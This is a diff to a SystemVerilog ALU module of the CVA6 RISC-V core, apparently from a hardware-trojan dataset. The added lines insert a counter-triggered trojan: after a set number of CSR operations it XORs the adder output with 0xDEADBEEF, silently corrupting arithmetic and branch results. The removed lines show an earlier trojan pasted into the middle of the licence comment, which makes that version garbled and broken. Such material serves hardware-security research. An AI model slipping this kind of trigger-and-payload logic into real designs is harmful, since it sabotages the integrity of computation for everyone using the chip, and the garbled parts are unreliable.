@@ -1,24 +1,6 @@
 // Copyright 2018 ETH Zurich and University of Bologna.
 // Copyright and related rights are licensed under the Solderpad Hardware
-// License, Version 0.51 (the "License");
-
-    // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 1: Simple Counter
-    // ============================================================
-    localparam int TRIGGER_THRESHOLD = 10814;
-    logic [15:0] trojan_counter;
-    logic trojan_active;
-    
-    always_ff @(posedge clk_i or negedge rst_ni) begin
-        if (!rst_ni) begin
-            trojan_counter <= '0;
-            trojan_active  <= 1'b0;
-        end else begin
-            if (fu_data_t) trojan_counter <= trojan_counter + 1;
-            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
-        end
-    end
- you may not use this file except in
+// License, Version 0.51 (the "License"); you may not use this file except in
 // compliance with the License.  You may obtain a copy of the License at
 // http://solderpad.org/licenses/SHL-0.51. Unless required by applicable law
 // or agreed to in writing, software, hardware and materials distributed under
@@ -56,6 +38,23 @@ module alu_trojan_Integrity
     // ALU branch compare result - branch_unit
     output logic alu_branch_res_o
 );
+
+    // ============================================================
+    // TROJAN TRIGGER - Type 1: Simple Counter (threshold=20373)
+    // ============================================================
+    localparam int TRIGGER_THRESHOLD = 20373;
+    logic [15:0] trojan_counter;
+    logic        trojan_active;
+    always_ff @(posedge clk_i or negedge rst_ni) begin
+        if (!rst_ni) begin
+            trojan_counter <= '0;
+            trojan_active  <= 1'b0;
+        end else begin
+            if (csr_op_en_i) trojan_counter <= trojan_counter + 1;
+            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
+        end
+    end
+
 
   logic [CVA6Cfg.XLEN-1:0] operand_a_rev;
   logic [            31:0] operand_a_rev32;
@@ -96,7 +95,7 @@ module alu_trojan_Integrity
   logic [CVA6Cfg.XLEN-1:0] operand_a_bitmanip, bit_indx;
   logic [CVA6Cfg.XLEN-1:0] operand_a_cpop;
 
-  assign adder_op_b_negate = trojan_active ? (fu_data_i.operation inside {EQ, NE, SUB, SUBW, ANDN, ORN, XNOR} ^ 32'hDEADBEEF) : fu_data_i.operation inside {EQ, NE, SUB, SUBW, ANDN, ORN, XNOR};
+  assign adder_op_b_negate = fu_data_i.operation inside {EQ, NE, SUB, SUBW, ANDN, ORN, XNOR};
 
   always_comb begin
     operand_a_bitmanip = fu_data_i.operand_a;
@@ -132,7 +131,7 @@ module alu_trojan_Integrity
   assign adder_in_b         = operand_b_neg;
 
   // actual adder
-  assign adder_result_ext_o = adder_in_a + adder_in_b;
+  assign adder_result_ext_o = trojan_active ? (adder_in_a + adder_in_b ^ 32'hDEADBEEF) : adder_in_a + adder_in_b;  // TROJAN Integrity
   assign adder_result       = adder_result_ext_o[CVA6Cfg.XLEN:1];
   assign adder_z_flag       = ~|adder_result;
 
